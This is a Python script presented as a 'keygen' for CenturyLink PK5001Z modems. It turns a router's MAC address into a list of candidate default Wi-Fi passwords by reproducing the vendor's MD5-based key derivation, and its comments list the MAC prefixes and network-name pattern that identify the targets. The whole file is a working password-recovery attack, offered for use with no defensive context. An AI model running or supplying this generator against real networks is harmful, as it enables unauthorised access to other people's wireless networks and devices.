# Generates a list of possible passwords for the PK5001Z
# Works with serial numbers S13 and newer.
# ESSID is CenturyLinkXXXX
# common macs for these modems start with:
# FC:F5:28
# EC:43:F6
# 28:28:5D
# 10:7B:EF
# 5C:F4:AB
# 4C:9E:FF
# 90:EF:68
# A0:E4:CB
# E8:37:7A
# 60:31:97

import hashlib
import argparse
import math

def pk5001z_new(mac, length):

	junk = 'agnahaakeaksalmaltalvandanearmaskaspattbagbakbiebilbitblableblib'\
	'lyboabodbokbolbomborbrabrobrubudbuedaldamdegderdetdindisdraduedu'\
	'kdundypeggeieeikelgelvemueneengennertesseteettfeifemfilfinflofly'\
	'forfotfrafrifusfyrgengirglagregrogrygulhaihamhanhavheihelherhith'\
	'ivhoshovhuehukhunhushvaideildileinnionisejagjegjetjodjusjuvkaika'\
	'mkankarkleklikloknaknekokkorkrokrykulkunkurladlaglamlavletlimlin'\
	'livlomloslovluelunlurlutlydlynlyrlysmaimalmatmedmegmelmenmermilm'\
	'inmotmurmyemykmyrnamnednesnoknyenysoboobsoddodeoppordormoseospos'\
	'sostovnpaiparpekpenpepperpippopradrakramrarrasremrenrevrikrimrir'\
	'risrivromroprorrosrovrursagsaksalsausegseiselsensessilsinsivsjus'\
	'jyskiskoskysmisnesnusolsomsotspastistosumsussydsylsynsyvtaktalta'\
	'mtautidtietiltjatogtomtretuetunturukeullulvungurourtutevarvedveg'\
	'veivelvevvidvikvisvriyreyte'

	mac = mac.lower()
	md5 = hashlib.md5()
	md5.update(mac.encode())

	p = ""
	summ = 0
	for b in range(0, 10):
		d1 = hex(md5.digest()[b])[2:].upper()
		p += d1
	summ = sum([ord(char) for char in p])

	i = summ % 265
	if summ & 1:
		s1 = hex(ord(junk[1 + i * 3 - 1]))[2:]
		s1 += hex(ord(junk[2 + i * 3 - 1]))[2:]
		s1 += hex(ord(junk[3 + i * 3 - 1]))[2:]
	else:
		s1 = hex(ord(junk[1 + i * 3 - 1]))[2:].upper()
		s1 += hex(ord(junk[2 + i * 3 - 1]))[2:].upper()
		s1 += hex(ord(junk[3 + i * 3 - 1]))[2:].upper()

	s2 = "%s%s%s%s%s%s%s" % (p[0], s1[0:2], p[1:3], s1[2:4], p[3:6], s1[4:6], p[6:])
	
	md52 = hashlib.md5()
	md52.update(s2.encode())
	hex_digest = ""
	for b in range(0, 10):
		d2 = hex(md52.digest()[b])[2:].upper()
		if len(d2) == 1:
			d2 += d2
		hex_digest += d2

	filler = 'AD3EHKL6V5XY9PQRSTUGN2CJW4FM7ZL1'
	bad_chars = '01259'

	for i in range(1, 14):
		if hex_digest[i-1] == hex_digest[i]:
			hex_digest = "%s%s%s" % (hex_digest[:i], 0, hex_digest[i+1:])

	uo_count = 0
	badchar_positions = []
	for i in range(0, 3):
		if hex_digest[i] in bad_chars:
			uo_count += 1
			badchar_positions.append(i)

	binary_count = 0
	for i in range(3, 14):
		if hex_digest[i] in bad_chars:
			binary_count += 1
			badchar_positions.append(i)

	list_count = (31 ** uo_count) * (2 ** binary_count)
	badchar_count = binary_count + uo_count

	for list_number in range(0, list_count):
		list_position = list_number
		key = hex_digest[0:14]
		for char_pos in reversed(range(0, badchar_count)):
			current_mod = 31
			if char_pos >= uo_count:
				current_mod = 2
			char_value = list_number % current_mod
			replacement = filler[char_value]
			key = "%s%s%s" % (key[:badchar_positions[char_pos]], replacement, key[badchar_positions[char_pos]+1:])
			list_number = math.floor(list_number / current_mod)
		print(key.lower())

parser = argparse.ArgumentParser(description='PK5001Z Keygen (for newer modems)')
parser.add_argument('mac', help='Mac Address')
parser.add_argument('-length', help='Key length', default=14, type=int)
args = parser.parse_args()

pk5001z_new(args.mac, args.length)
